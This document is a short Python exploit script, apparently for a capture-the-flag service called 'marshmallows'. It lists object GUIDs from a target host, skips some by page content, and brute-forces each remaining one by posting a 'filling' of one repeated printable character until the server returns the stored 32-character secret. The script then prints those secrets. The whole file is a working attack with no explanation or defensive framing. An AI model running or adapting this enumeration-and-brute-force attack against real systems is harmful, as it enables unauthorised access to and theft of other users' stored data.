#!/usr/bin/env python3

import re
import sys
import json
import requests

from string import printable


URL = 'http://%s:17171/' % sys.argv[1]


def get_marshmallows_list(limit):
    html = requests.get(URL + 'marshmallows').text
    return re.findall('/marshmallows/(.*?)">', html)


def filter_marshmallows(guids):
    for guid in guids:
        html = requests.get(URL + 'marshmallows/' + guid).text
        if 'prove' not in html and 'default' not in html:
            yield guid


def brute_password(guid, length):
    for x in printable:
        response = requests.post(URL + 'marshmallows/' + guid, json={'filling': x*length})
        answer = json.loads(response.text)
        if answer['success']:
            return answer['filling']


if __name__ == '__main__':
    flag_length = 32
    for guid in filter_marshmallows(get_marshmallows_list(10)):
        print(brute_password(guid, flag_length))
